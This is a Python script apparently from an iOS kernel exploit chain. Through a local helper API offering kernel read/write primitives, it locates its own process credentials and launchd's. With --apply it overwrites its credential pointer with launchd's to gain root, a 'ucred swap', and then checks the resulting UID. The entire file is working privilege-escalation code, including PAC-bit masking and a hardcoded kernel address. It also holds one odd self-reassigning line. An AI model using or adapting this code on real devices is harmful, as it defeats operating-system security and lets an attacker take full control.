#!/usr/bin/env python3
"""Compute proc_ro and ucred addresses and optionally perform ucred swap.

Usage:
  python do_ucred_swap.py [--api URL] [--launchd 0xADDR] [--apply] [--use-endpoint]

By default runs in dry-run mode and prints computed addresses. To perform
the write, use --apply. Alternatively, use --use-endpoint to call
/api/v1/elevate with method=ucred_swap (if supported by helper).

Safety: This script will NOT write to kernel memory unless --apply or
--use-endpoint is provided. kwrite errors/connection drops are handled
and reported as CRITICAL.
"""
import os
import sys
import time
import argparse
import requests

TIMEOUT = 15.0
KREAD_RETRIES = 3


def panic(msg):
    print(msg)
    sys.exit(1)


def api_get(base, path):
    try:
        r = requests.get(base + path, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print('[CRITICAL]  CRASHED: Connection lost during API GET.')
        sys.exit(1)
    except Exception as e:
        print('API GET error:', e)
        return None


def api_post(base, path, json=None):
    try:
        r = requests.post(base + path, json=json, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print('[CRITICAL]  CRASHED: Connection lost during API POST.')
        sys.exit(1)
    except Exception as e:
        print('API POST error:', e)
        return None


def kread64(base, addr):
    last = None
    for attempt in range(1, KREAD_RETRIES + 1):
        try:
            resp = api_post(base, '/api/v1/kread', json={'addr': hex(addr), 'size': 8})
            if resp is None:
                last = RuntimeError('no response')
                time.sleep(0.2)
                continue
            if 'value' in resp and isinstance(resp['value'], str):
                s = resp['value']
                if s.startswith('0x'):
                    s = s[2:]
                if len(s) % 2:
                    s = '0' + s
                b = bytes.fromhex(s)
                return int.from_bytes(b, 'little')
            if 'data' in resp:
                d = resp['data']
                if isinstance(d, list):
                    return int.from_bytes(bytes(d), 'little')
                if isinstance(d, str):
                    s = d[2:] if d.startswith('0x') else d
                    if len(s) % 2:
                        s = '0' + s
                    return int.from_bytes(bytes.fromhex(s), 'little')
            last = RuntimeError('unsupported format')
        except requests.exceptions.ConnectionError:
            print('[CRITICAL]  CRASHED: Connection lost during kread.')
            sys.exit(1)
        except Exception as e:
            last = e
            time.sleep(0.2)
    raise last if last else RuntimeError('kread64 failed')


def kwrite64(base, addr, value):
    try:
        data = value.to_bytes(8, 'little')
        resp = api_post(base, '/api/v1/kwrite', json={'addr': hex(addr), 'data': data.hex()})
        return resp
    except requests.exceptions.ConnectionError:
        print('[CRITICAL]  CRASHED: Connection lost during kwrite. Helper process likely killed by kernel.')
        sys.exit(1)
    except Exception as e:
        print('kwrite error:', e)
        return None


def mask_pac(x):
    # Apply user-specified mask to clear PAC/tag bits. Using lower 40-bit mask per spec.
    return x & 0xFFFFFFFFFF


def main():
    p = argparse.ArgumentParser()
    p.add_argument('--api', default=os.environ.get('API_BASE', 'http://127.0.0.1:8000'))
    p.add_argument('--launchd', default='0xffffffe226179540', help='launchd proc address (hex)')
    p.add_argument('--apply', action='store_true', help='Perform kwrite to swap ucred')
    p.add_argument('--use-endpoint', action='store_true', help='Call /api/v1/elevate method=ucred_swap')
    args = p.parse_args()

    base = args.api.rstrip('/')

    ds = api_get(base, '/api/v1/ds')
    if not ds:
        panic('Failed to read /api/v1/ds')
    if 'our_proc' in ds:
        our_proc = int(ds['our_proc'], 0) if isinstance(ds['our_proc'], str) else int(ds['our_proc'])
    elif 'ourproc' in ds:
        our_proc = int(ds['ourproc'], 0) if isinstance(ds['ourproc'], str) else int(ds['ourproc'])
    else:
        panic('our_proc not found in /api/v1/ds')

    kernel_base = None
    if 'kernel_base' in ds:
        kernel_base = int(ds['kernel_base'], 0) if isinstance(ds['kernel_base'], str) else int(ds['kernel_base'])

    print(f'our_proc = 0x{our_proc:016x}')
    if kernel_base:
        print(f'kernel_base = 0x{kernel_base:016x}')

    # compute proc_ro from our_proc + 0x18
    raw = kread64(base, our_proc + 0x18)
    proc_ro = mask_pac(raw)
    print(f'raw proc_ro for our_proc+0x18 = 0x{raw:016x} -> masked 0x{proc_ro:016x}')

    # read our ucred
    raw_ucred = kread64(base, proc_ro + 0x20)
    our_ucred = mask_pac(raw_ucred)
    print(f'raw our_ucred at proc_ro+0x20 = 0x{raw_ucred:016x} -> masked 0x{our_ucred:016x}')

    # launchd
    launchd_proc = int(args.launchd, 0)
    print(f'launchd_proc = 0x{launchd_proc:016x}')
    raw_launchd_proc_ro = kread64(base, launchd_proc + 0x18)
    launchd_proc_ro = mask_pac(raw_launchd_proc_ro)
    print(f'raw launchd_proc_ro = 0x{raw_launchd_proc_ro:016x} -> masked 0x{launchd_proc_ro:016x}')
    raw_launchd_ucred = kread64(base, launchd_proc_ro + 0x20)
    launchd_ucred = mask_pac(raw_launchd_ucred)
    print(f'raw launchd_ucred = 0x{raw_launchd_ucred:016x} -> masked 0x{launchd_ucred:016x}')

    target = launchd_ucred
    dest_addr = proc_ro + 0x20
    print('\nPlanned swap: write target_ucred 0x{0:016x} to proc_ro+0x20 at 0x{1:016x}'.format(target, dest_addr))

    if args.use_endpoint:
        print('Calling /api/v1/elevate method=ucred_swap')
        payload = {'method': 'ucred_swap', 'our_proc': hex(our_proc), 'proc_ro': hex(proc_ro), 'our_ucred': hex(our_ucred), 'target_ucred': hex(target)}
        r = api_post(base, '/api/v1/elevate', json=payload)
        print('elevate response:', r)
        print('Check /api/v1/ids for UID change')
        ids = api_get(base, '/api/v1/ids')
        print('ids:', ids)
        return

    if not args.apply:
        print('\nDry-run: no writes performed. To perform write pass --apply.')
        return

    # perform kwrite of 8 bytes (target pointer) to dest_addr
    print('Performing kwrite...')
    resp = kwrite64 = kwrite64 if 'kwrite64' in globals() else None
    try:
        res = kwrite64(base, dest_addr, target)
        print('kwrite response:', res)
    except Exception as e:
        print('kwrite exception:', e)
        return

    print('After write, check /api/v1/ids:')
    ids = api_get(base, '/api/v1/ids')
    print('ids:', ids)


if __name__ == '__main__':
    main()
